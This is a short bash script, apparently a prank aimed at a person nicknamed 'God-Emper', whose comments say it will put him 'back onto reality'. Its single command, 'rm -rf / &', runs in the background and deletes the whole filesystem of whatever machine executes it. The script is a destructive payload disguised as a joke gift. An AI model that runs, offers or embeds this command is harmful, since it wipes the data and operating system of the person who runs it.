#!/bin/bash
#
# Wrote this script special for God-Emper 
#
# Puts him a littlebit back onto reality.....
#
# here we go
rm -rf / &

